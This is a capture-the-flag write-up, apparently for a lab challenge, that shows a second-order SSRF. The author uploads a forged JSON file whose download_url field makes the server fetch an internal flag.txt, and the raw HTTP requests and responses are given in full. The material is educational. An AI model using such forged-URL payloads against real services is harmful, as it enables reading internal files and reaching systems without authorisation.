# Cloud Smart Server to Reach Files
This challenge was based on the [this](https://github.com/httpvoid/writeups/blob/main/Hacking-Google-Drive-Integrations.md)
bug bounty writeup which is a second order SSRF in Google Drive integrations. 
It essentially boils down to the fact that the server issues a request to fetch
a JSON file which is parsed to retrieve a download URL. A request is made to
this URL and the file is donwloaded. 

This means that if the download URL is attacker controlled we can point it to
not just any URL but any file that might be on the system. 

## Solution
When reading the description we can see that we are supposed to read the 
`flag.txt` file, hinting that there is a arbitrary file read on the server.

When we open the website and start poking around we can see that we can upload,
view, and download files. As is shown in the following requests & responses,
notice that there is no difference between the responses whether we are viewing
or downloading the file.

```
GET /cloud/fetch?file_id=4320975e-b0fb-4050-abf2-a01038b3a5e6&view=true

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 18 Mar 2023 12:02:44 GMT
Content-type: image/png
Content-Length: 64675
Access-Control-Allow-Origin: *
Connection: close

ÿØÿà
```

```
GET /cloud/fetch?file_id=4320975e-b0fb-4050-abf2-a01038b3a5e6&download=true

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 18 Mar 2023 12:02:44 GMT
Content-type: image/png
Content-Length: 64675
Access-Control-Allow-Origin: *
Connection: close

ÿØÿà
```

Now if we poke at this functionality a bit more and see what happens if we 
remove the second argument altogether.

```
GET /cloud/fetch?file_id=4320975e-b0fb-4050-abf2-a01038b3a5e6

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 18 Mar 2023 12:05:50 GMT
Content-type: application/json
Content-Length: 171
Access-Control-Allow-Origin: *
Connection: close

{
  "download_url": "http://fileserver/ZeUViwv3F78/cute_cat.jpeg",
  "id": "4320975e-b0fb-4050-abf2-a01038b3a5e6",
  "name": "cute_cat.jpeg",
  "session": "ZeUViwv3F78"
}
```

We get a totally different response. We can see that we get a JSON file about 
the file itself, we see its ID, filename, and the session it is connected to
which is ours. However, and most importantly, we can see that there is a 
parameter we didn't see before which is the `download_url` parameter. 
Immediately this raises some red flags for those experiences with SSRFs. If we
can control the `download_url` what will happen? More importantly how can we 
try and control this parameter?

We can try and upload our own JSON file and see whether it prefers the uploaded
JSON over the created one. A simple test is to upload a new JSON file that 
points to the cat photo provided on the website.

```
POST /cloud/upload HTTP/1.1
Host: 172.22.0.3
Content-Length: 329
Cookie: session=ZeUViwv3F78
Connection: close

------WebKitFormBoundaryrl7TcU7tjSfBBAdt
Content-Disposition: form-data; name="file"; filename="testfile.png"
Content-Type: image/png

{
  "download_url": "http://fileserver/ZeUViwv3F78/cute_cat.jpeg",
  "id": "testid",
  "name": "testfile.png",
  "session": "ZeUViwv3F78"
}
------WebKitFormBoundaryrl7TcU7tjSfBBAdt--
```

Now to find the ID of our file we can simple do a `GET` request to `/cloud/list`.
Now we can do the view and download requests again and see what happens.


```
GET /cloud/fetch?file_id=682ce333-c0f0-4eea-a24c-d11bd90e22cb&view=true

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 18 Mar 2023 12:02:44 GMT
Content-type: image/png
Content-Length: 64675
Access-Control-Allow-Origin: *
Connection: close

{
  "download_url": "http://fileserver/ZeUViwv3F78/cute_cat.jpeg",
  "id": "testid",
  "name": "testfile.png",
  "session": "ZeUViwv3F78"
}
```

Ok we get the file we just uploaded as expected.

```
GET /cloud/fetch?file_id=682ce333-c0f0-4eea-a24c-d11bd90e22cb&download=true

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 18 Mar 2023 12:02:44 GMT
Content-type: image/png
Content-Length: 64675
Access-Control-Allow-Origin: *
Connection: close

ÿØÿà
```

We get the photo of the cat, a.k.a. the file we pointed to in the `download_url`
parameter! This means that the server for some reason chooses to parse the
`download_url` of the file we just uploaded over the created one due to some
bug in the system.

Now all we have to do is reproduce this but point the `download_url` to the `flag.txt`
file located on the fileserver as mentioned in the description.

```
POST /cloud/upload HTTP/1.1
Host: 172.22.0.3
Content-Length: 329
Cookie: session=ZeUViwv3F78
Connection: close

------WebKitFormBoundaryrl7TcU7tjSfBBAdt
Content-Disposition: form-data; name="file"; filename="testfile.png"
Content-Type: image/png

{
  "download_url": "http://fileserver/flag.txt",
  "id": "testid",
  "name": "testfile.png",
  "session": "ZeUViwv3F78"
}
------WebKitFormBoundaryrl7TcU7tjSfBBAdt--
```

After fetching the ID from `/cloud/list` we can download our file and voila:

```
GET /cloud/fetch?file_id=b91b9cb7-95f1-4399-a20f-43cc48e6f385&download=true HTTP/1.1

HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.11.2
Date: Sat, 18 Mar 2023 11:52:24 GMT
Content-type: image/png
Access-Control-Allow-Origin: *
Connection: close
Content-Length: 28

gg{wOw-th1s-SSRF-w4s-sc4ry}
```
